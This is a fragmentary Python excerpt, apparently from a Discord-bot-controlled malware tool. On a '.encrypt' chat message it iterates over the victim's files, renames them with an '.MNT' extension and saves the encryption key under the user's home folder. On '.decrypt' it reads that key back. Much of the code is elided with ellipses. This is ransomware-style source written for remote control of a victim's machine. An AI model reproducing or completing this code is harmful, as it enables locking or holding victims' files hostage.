...
# on message
    ...
    if message.content.strip() == '.encrypt':
            ...
            for file in files:
                ...
                if not file_path.endswith('.MNT'):
                    ...
                    if os.path.basename(file_path) not in running_processes:
                        ...
                        new_file_name = os.path.splitext(file_path)[0] + '.MNT'
        ...
        with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\MNT_encryption.key', 'wb') as key_file:
            key_file.write(key)
    ...
    if message.content.strip() == '.decrypt':
        ...
        with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\MNT_encryption.key', "rb") as key_file:
            key = key_file.read()
